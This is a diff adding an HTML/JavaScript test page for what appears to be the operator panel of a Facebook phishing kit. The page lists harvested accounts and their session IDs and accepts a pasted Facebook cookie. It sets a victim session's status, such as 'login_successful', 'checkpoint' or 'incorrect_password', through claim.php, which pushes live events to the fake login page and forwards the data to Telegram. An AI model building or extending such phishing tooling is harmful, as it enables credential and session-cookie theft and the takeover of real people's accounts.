@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Claim - Trigger Pusher Event</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+        #accounts {
+            margin-top: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 15px;
+            background: #f9f9f9;
+        }
+        .account-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Test Claim - Trigger Pusher Event</h1>
+    
+    <div id="accounts">
+        <h3>Available Accounts (from dataaccess.json):</h3>
+        <div id="accounts-list">Loading...</div>
+    </div>
+
+    <form id="claimForm">
+        <div class="form-group">
+            <label for="waterfall_id">Waterfall ID (Session ID):</label>
+            <input type="text" id="waterfall_id" name="waterfall_id" required>
+        </div>
+
+        <div class="form-group">
+            <label for="status">Status:</label>
+            <select id="status" name="status" required>
+                <option value="login_successful">✅ Login Successful (Send to Telegram)</option>
+                <option value="approved">Approved</option>
+                <option value="checkpoint">Checkpoint</option>
+                <option value="incorrect_password">Incorrect Password (Wrong Credentials)</option>
+                <option value="rejected">Rejected</option>
+                <option value="pending">Pending</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="cookie">Cookie (Optional):</label>
+            <textarea id="cookie" name="cookie" rows="4" placeholder="Paste Facebook cookie here (optional)..."></textarea>
+        </div>
+
+        <button type="submit">Send Claim & Trigger Pusher</button>
+    </form>
+
+    <div id="result"></div>
+
+    <script>
+        // Load accounts from dataaccess.json
+        fetch('get_accounts.php')
+            .then(r => r.json())
+            .then(data => {
+                const list = document.getElementById('accounts-list');
+                if (data.accounts && data.accounts.length > 0) {
+                    list.innerHTML = data.accounts.map(acc => `
+                        <div class="account-item">
+                            <strong>${acc.contact_point}</strong> - Status: ${acc.status}<br>
+                            <small>Waterfall ID: ${acc.waterfall_id}</small><br>
+                            <button onclick="fillForm('${acc.waterfall_id}')">Use This ID</button>
+                        </div>
+                    `).join('');
+                } else {
+                    list.innerHTML = '<p>No accounts found. Login first to create an account.</p>';
+                }
+            })
+            .catch(err => {
+                document.getElementById('accounts-list').innerHTML = '<p>Error loading accounts</p>';
+            });
+
+        function fillForm(waterfallId) {
+            document.getElementById('waterfall_id').value = waterfallId;
+        }
+
+        document.getElementById('claimForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const resultDiv = document.getElementById('result');
+            
+            resultDiv.style.display = 'block';
+            resultDiv.className = '';
+            resultDiv.innerHTML = 'Sending...';
+
+            fetch('claim.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Response:', data);
+                
+                if (data.success) {
+                    resultDiv.className = 'success';
+                    var cookieInfo = data.cookie && data.cookie !== 'Not provided' 
+                        ? `Cookie: ${data.cookie} (${data.cookie_length} chars)<br>` 
+                        : '';
+                    var telegramInfo = data.telegram_sent !== undefined 
+                        ? `Telegram Sent: ${data.telegram_sent ? '✅ Yes' : '❌ No'}<br>` 
+                        : '';
+                    resultDiv.innerHTML = `
+                        <strong>✅ Success!</strong><br>
+                        ${data.message}<br>
+                        Waterfall ID: ${data.waterfall_id}<br>
+                        Status: ${data.status}<br>
+                        ${cookieInfo}
+                        Pusher Triggered: ${data.pusher_triggered ? '✅ Yes' : '❌ No'}<br>
+                        ${telegramInfo}
+                        Channel: ${data.channel}<br>
+                        <br>
+                        <em>Check your login page - Pusher event should be triggered!</em>
+                        ${data.telegram_sent ? '<br><strong>📱 Also check your Telegram!</strong>' : ''}
+                    `;
+                } else {
+                    resultDiv.className = 'error';
+                    resultDiv.innerHTML = `
+                        <strong>❌ Error!</strong><br>
+                        ${data.message}
+                    `;
+                }
+            })
+            .catch(error => {
+                resultDiv.className = 'error';
+                resultDiv.innerHTML = '<strong>❌ Network Error!</strong><br>' + error;
+            });
+        });
+    </script>
+</body>
+</html>
+
